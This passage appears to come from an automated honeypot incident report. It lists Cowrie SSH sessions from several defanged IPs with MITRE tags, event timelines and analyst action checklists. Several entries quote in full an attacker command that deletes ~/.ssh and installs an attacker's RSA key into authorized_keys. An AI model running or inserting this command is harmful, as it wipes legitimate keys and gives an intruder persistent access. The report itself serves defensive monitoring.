| `2026-06-10 09:13:15` | `cowrie.client.kex` |
| `2026-06-10 09:13:16` | `cowrie.login.success` |
| `2026-06-10 09:13:16` | `cowrie.session.params` |
| `2026-06-10 09:13:16` | `cowrie.command.input` |
| `2026-06-10 09:13:16` | `cowrie.command.failed` |
| `2026-06-10 09:13:17` | `cowrie.log.closed` |
| `2026-06-10 09:13:17` | `cowrie.session.params` |
| `2026-06-10 09:13:17` | `cowrie.command.input` |
| `2026-06-10 09:13:17` | `cowrie.session.file_download` |
| `2026-06-10 09:13:17` | `cowrie.log.closed` |
| `2026-06-10 09:13:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.33.93[.]17` to AbuseIPDB if not already reported
- [ ] Block `45.33.93[.]17` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d603fe6e0478

| Field | Detail |
|---|---|
| **Source IP** | `45.33.93[.]17` |
| **First Seen** | 2026-06-10 09:13 |
| **Last Seen** | 2026-06-10 09:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 09:13:20` | `cowrie.session.connect` |
| `2026-06-10 09:13:20` | `cowrie.client.version` |
| `2026-06-10 09:13:20` | `cowrie.client.kex` |
| `2026-06-10 09:13:21` | `cowrie.login.success` |
| `2026-06-10 09:13:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.33.93[.]17` to AbuseIPDB if not already reported
- [ ] Block `45.33.93[.]17` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a923aba14f6

| Field | Detail |
|---|---|
| **Source IP** | `45.33.93[.]17` |
| **First Seen** | 2026-06-10 09:18 |
| **Last Seen** | 2026-06-10 09:18 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 09:18:35` | `cowrie.session.connect` |
| `2026-06-10 09:18:35` | `cowrie.client.version` |
| `2026-06-10 09:18:35` | `cowrie.client.kex` |
| `2026-06-10 09:18:36` | `cowrie.login.success` |
| `2026-06-10 09:18:37` | `cowrie.session.params` |
| `2026-06-10 09:18:37` | `cowrie.command.input` |
| `2026-06-10 09:18:37` | `cowrie.command.failed` |
| `2026-06-10 09:18:37` | `cowrie.log.closed` |
| `2026-06-10 09:18:37` | `cowrie.session.params` |
| `2026-06-10 09:18:37` | `cowrie.command.input` |
| `2026-06-10 09:18:38` | `cowrie.session.file_download` |
| `2026-06-10 09:18:38` | `cowrie.log.closed` |
| `2026-06-10 09:18:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.33.93[.]17` to AbuseIPDB if not already reported
- [ ] Block `45.33.93[.]17` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e50fc2a4d3d

| Field | Detail |
|---|---|
| **Source IP** | `45.33.93[.]17` |
| **First Seen** | 2026-06-10 09:18 |
| **Last Seen** | 2026-06-10 09:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 09:18:41` | `cowrie.session.connect` |
| `2026-06-10 09:18:41` | `cowrie.client.version` |
| `2026-06-10 09:18:41` | `cowrie.client.kex` |
| `2026-06-10 09:18:42` | `cowrie.login.success` |
| `2026-06-10 09:18:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.33.93[.]17` to AbuseIPDB if not already reported
- [ ] Block `45.33.93[.]17` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f79bf2659fd1

| Field | Detail |
|---|---|
| **Source IP** | `45.33.93[.]17` |
| **First Seen** | 2026-06-10 09:20 |
| **Last Seen** | 2026-06-10 09:20 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 09:20:25` | `cowrie.session.connect` |
| `2026-06-10 09:20:25` | `cowrie.client.version` |
| `2026-06-10 09:20:25` | `cowrie.client.kex` |
| `2026-06-10 09:20:26` | `cowrie.login.success` |
| `2026-06-10 09:20:26` | `cowrie.session.params` |
| `2026-06-10 09:20:26` | `cowrie.command.input` |
| `2026-06-10 09:20:26` | `cowrie.command.failed` |
| `2026-06-10 09:20:27` | `cowrie.log.closed` |
| `2026-06-10 09:20:27` | `cowrie.session.params` |
| `2026-06-10 09:20:27` | `cowrie.command.input` |
| `2026-06-10 09:20:28` | `cowrie.session.file_download` |
| `2026-06-10 09:20:28` | `cowrie.log.closed` |
| `2026-06-10 09:20:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.33.93[.]17` to AbuseIPDB if not already reported
- [ ] Block `45.33.93[.]17` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c6d0ddc242b

| Field | Detail |
|---|---|
| **Source IP** | `45.33.93[.]17` |
| **First Seen** | 2026-06-10 09:20 |
| **Last Seen** | 2026-06-10 09:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 09:20:31` | `cowrie.session.connect` |
| `2026-06-10 09:20:31` | `cowrie.client.version` |
| `2026-06-10 09:20:31` | `cowrie.client.kex` |
| `2026-06-10 09:20:32` | `cowrie.login.success` |
| `2026-06-10 09:20:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.33.93[.]17` to AbuseIPDB if not already reported
- [ ] Block `45.33.93[.]17` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d1e6492cb407

| Field | Detail |
|---|---|
| **Source IP** | `45.33.93[.]17` |
| **First Seen** | 2026-06-10 09:24 |
| **Last Seen** | 2026-06-10 09:24 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 09:24:05` | `cowrie.session.connect` |
| `2026-06-10 09:24:05` | `cowrie.client.version` |
| `2026-06-10 09:24:05` | `cowrie.client.kex` |
| `2026-06-10 09:24:06` | `cowrie.login.success` |
| `2026-06-10 09:24:07` | `cowrie.session.params` |
| `2026-06-10 09:24:07` | `cowrie.command.input` |
| `2026-06-10 09:24:07` | `cowrie.command.failed` |
| `2026-06-10 09:24:07` | `cowrie.log.closed` |
| `2026-06-10 09:24:08` | `cowrie.session.params` |
| `2026-06-10 09:24:08` | `cowrie.command.input` |
| `2026-06-10 09:24:08` | `cowrie.session.file_download` |
| `2026-06-10 09:24:08` | `cowrie.log.closed` |
| `2026-06-10 09:24:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.33.93[.]17` to AbuseIPDB if not already reported
- [ ] Block `45.33.93[.]17` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e997228659ba

| Field | Detail |
|---|---|
| **Source IP** | `45.33.93[.]17` |
| **First Seen** | 2026-06-10 09:24 |
| **Last Seen** | 2026-06-10 09:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 09:24:11` | `cowrie.session.connect` |
| `2026-06-10 09:24:11` | `cowrie.client.version` |
| `2026-06-10 09:24:11` | `cowrie.client.kex` |
| `2026-06-10 09:24:12` | `cowrie.login.success` |
| `2026-06-10 09:24:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.33.93[.]17` to AbuseIPDB if not already reported
- [ ] Block `45.33.93[.]17` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f60d5a642c84

| Field | Detail |
|---|---|
| **Source IP** | `45.33.93[.]17` |
| **First Seen** | 2026-06-10 09:29 |
| **Last Seen** | 2026-06-10 09:29 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 09:29:40` | `cowrie.session.connect` |
| `2026-06-10 09:29:40` | `cowrie.client.version` |
| `2026-06-10 09:29:40` | `cowrie.client.kex` |
| `2026-06-10 09:29:41` | `cowrie.login.success` |
| `2026-06-10 09:29:41` | `cowrie.session.params` |
| `2026-06-10 09:29:41` | `cowrie.command.input` |
| `2026-06-10 09:29:41` | `cowrie.command.failed` |
| `2026-06-10 09:29:42` | `cowrie.log.closed` |
| `2026-06-10 09:29:42` | `cowrie.session.params` |
| `2026-06-10 09:29:42` | `cowrie.command.input` |
| `2026-06-10 09:29:43` | `cowrie.session.file_download` |
| `2026-06-10 09:29:43` | `cowrie.log.closed` |
| `2026-06-10 09:29:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.33.93[.]17` to AbuseIPDB if not already reported
- [ ] Block `45.33.93[.]17` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d6c78983a2b3

| Field | Detail |
|---|---|
| **Source IP** | `45.33.93[.]17` |
| **First Seen** | 2026-06-10 09:29 |
| **Last Seen** | 2026-06-10 09:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 09:29:46` | `cowrie.session.connect` |
| `2026-06-10 09:29:46` | `cowrie.client.version` |
| `2026-06-10 09:29:46` | `cowrie.client.kex` |
| `2026-06-10 09:29:47` | `cowrie.login.success` |
| `2026-06-10 09:29:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.33.93[.]17` to AbuseIPDB if not already reported
- [ ] Block `45.33.93[.]17` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b9b2666d176a

| Field | Detail |
|---|---|
| **Source IP** | `45.33.93[.]17` |
| **First Seen** | 2026-06-10 09:31 |
| **Last Seen** | 2026-06-10 09:31 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 09:31:25` | `cowrie.session.connect` |
| `2026-06-10 09:31:25` | `cowrie.client.version` |
| `2026-06-10 09:31:26` | `cowrie.client.kex` |
| `2026-06-10 09:31:27` | `cowrie.login.success` |
| `2026-06-10 09:31:27` | `cowrie.session.params` |
| `2026-06-10 09:31:27` | `cowrie.command.input` |
| `2026-06-10 09:31:27` | `cowrie.command.failed` |
| `2026-06-10 09:31:28` | `cowrie.log.closed` |
| `2026-06-10 09:31:28` | `cowrie.session.params` |
| `2026-06-10 09:31:28` | `cowrie.command.input` |
| `2026-06-10 09:31:28` | `cowrie.session.file_download` |
| `2026-06-10 09:31:28` | `cowrie.log.closed` |
| `2026-06-10 09:31:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.33.93[.]17` to AbuseIPDB if not already reported
- [ ] Block `45.33.93[.]17` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f5ce1afd5e51

| Field | Detail |
|---|---|
| **Source IP** | `45.33.93[.]17` |
| **First Seen** | 2026-06-10 09:31 |
| **Last Seen** | 2026-06-10 09:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 09:31:31` | `cowrie.session.connect` |
| `2026-06-10 09:31:31` | `cowrie.client.version` |
| `2026-06-10 09:31:32` | `cowrie.client.kex` |
| `2026-06-10 09:31:33` | `cowrie.login.success` |
| `2026-06-10 09:31:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.33.93[.]17` to AbuseIPDB if not already reported
- [ ] Block `45.33.93[.]17` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7789f1c082c3

| Field | Detail |
|---|---|
| **Source IP** | `196.189.237[.]172` |
| **First Seen** | 2026-06-10 09:57 |
| **Last Seen** | 2026-06-10 09:57 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 09:57:20` | `cowrie.session.connect` |
| `2026-06-10 09:57:20` | `cowrie.client.version` |
| `2026-06-10 09:57:20` | `cowrie.client.kex` |
| `2026-06-10 09:57:21` | `cowrie.login.success` |
| `2026-06-10 09:57:21` | `cowrie.session.params` |
| `2026-06-10 09:57:21` | `cowrie.command.input` |
| `2026-06-10 09:57:21` | `cowrie.command.failed` |
| `2026-06-10 09:57:22` | `cowrie.log.closed` |
| `2026-06-10 09:57:22` | `cowrie.session.params` |
| `2026-06-10 09:57:22` | `cowrie.command.input` |
| `2026-06-10 09:57:22` | `cowrie.session.file_download` |
| `2026-06-10 09:57:22` | `cowrie.log.closed` |
| `2026-06-10 09:57:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.189.237[.]172` to AbuseIPDB if not already reported
- [ ] Block `196.189.237[.]172` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d812cbb402a7

| Field | Detail |
|---|---|
| **Source IP** | `196.189.237[.]172` |
| **First Seen** | 2026-06-10 09:57 |
| **Last Seen** | 2026-06-10 09:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 09:57:25` | `cowrie.session.connect` |
| `2026-06-10 09:57:25` | `cowrie.client.version` |
| `2026-06-10 09:57:26` | `cowrie.client.kex` |
| `2026-06-10 09:57:26` | `cowrie.login.success` |
| `2026-06-10 09:57:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.189.237[.]172` to AbuseIPDB if not already reported
- [ ] Block `196.189.237[.]172` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e0fa8814bc16

| Field | Detail |
|---|---|
| **Source IP** | `196.189.237[.]172` |
| **First Seen** | 2026-06-10 10:01 |
| **Last Seen** | 2026-06-10 10:01 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 10:01:19` | `cowrie.session.connect` |
| `2026-06-10 10:01:19` | `cowrie.client.version` |
| `2026-06-10 10:01:19` | `cowrie.client.kex` |
| `2026-06-10 10:01:20` | `cowrie.login.success` |
| `2026-06-10 10:01:20` | `cowrie.session.params` |
| `2026-06-10 10:01:20` | `cowrie.command.input` |
| `2026-06-10 10:01:20` | `cowrie.command.failed` |
| `2026-06-10 10:01:21` | `cowrie.log.closed` |
| `2026-06-10 10:01:21` | `cowrie.session.params` |
| `2026-06-10 10:01:21` | `cowrie.command.input` |
| `2026-06-10 10:01:21` | `cowrie.session.file_download` |
| `2026-06-10 10:01:21` | `cowrie.log.closed` |
| `2026-06-10 10:01:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.189.237[.]172` to AbuseIPDB if not already reported
- [ ] Block `196.189.237[.]172` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-76ff6cb1f9bc

| Field | Detail |
|---|---|
| **Source IP** | `196.189.237[.]172` |
| **First Seen** | 2026-06-10 10:01 |
| **Last Seen** | 2026-06-10 10:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 10:01:23` | `cowrie.session.connect` |
| `2026-06-10 10:01:23` | `cowrie.client.version` |
| `2026-06-10 10:01:24` | `cowrie.client.kex` |
| `2026-06-10 10:01:24` | `cowrie.login.success` |
| `2026-06-10 10:01:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.189.237[.]172` to AbuseIPDB if not already reported
- [ ] Block `196.189.237[.]172` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04c4fd56781f

| Field | Detail |
|---|---|
| **Source IP** | `119.203.251[.]187` |
| **First Seen** | 2026-06-10 10:02 |
| **Last Seen** | 2026-06-10 10:02 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 10:02:12` | `cowrie.session.connect` |
| `2026-06-10 10:02:12` | `cowrie.client.version` |
| `2026-06-10 10:02:12` | `cowrie.client.kex` |
| `2026-06-10 10:02:12` | `cowrie.login.success` |
| `2026-06-10 10:02:13` | `cowrie.session.params` |
| `2026-06-10 10:02:13` | `cowrie.command.input` |
| `2026-06-10 10:02:13` | `cowrie.command.failed` |
| `2026-06-10 10:02:13` | `cowrie.log.closed` |
| `2026-06-10 10:02:13` | `cowrie.session.params` |
| `2026-06-10 10:02:13` | `cowrie.command.input` |
| `2026-06-10 10:02:13` | `cowrie.session.file_download` |
| `2026-06-10 10:02:13` | `cowrie.log.closed` |
| `2026-06-10 10:02:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.203.251[.]187` to AbuseIPDB if not already reported
- [ ] Block `119.203.251[.]187` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d57cec0776c3

| Field | Detail |
|---|---|
| **Source IP** | `119.203.251[.]187` |
| **First Seen** | 2026-06-10 10:02 |
| **Last Seen** | 2026-06-10 10:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 10:02:15` | `cowrie.session.connect` |
| `2026-06-10 10:02:15` | `cowrie.client.version` |
| `2026-06-10 10:02:16` | `cowrie.client.kex` |
| `2026-06-10 10:02:16` | `cowrie.login.success` |
| `2026-06-10 10:02:16` | `cowrie.session.closed` |

**Recommended Actions:**
